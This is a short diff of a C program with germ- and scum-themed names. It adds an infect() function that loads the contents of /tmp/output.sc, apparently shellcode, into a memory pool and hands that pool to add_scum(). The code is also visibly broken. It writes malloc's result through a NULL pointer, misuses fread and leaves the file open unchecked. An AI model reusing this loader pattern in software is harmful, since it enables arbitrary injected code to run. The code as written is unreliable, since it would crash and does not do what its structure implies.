@@ -20,6 +20,38 @@ froth(void)
 }
 
 void
+infect(void)
+{
+    FILE       *file = NULL;
+    char       *buf  = NULL;
+    void       *addr = NULL;
+    unsigned    len  = 0;
+
+
+    file = fopen("/tmp/output.sc", "rb");
+
+    fseek(file, 0L, SEEK_END);
+
+    len = ftell(file);
+
+    fseek(file, 0L, SEEK_SET);
+
+    *buf = malloc(sizeof(char) * len);
+
+    fread(*buf, len, len, file);
+
+    fclose(file);
+
+    addr = spawn_pool;
+
+    memcpy(addr, buf, len);
+
+    free(buf);
+
+    add_scum(addr);
+}
+
+void
 add_scum(void *addr)
 {
     germ_t     *germ = NULL;
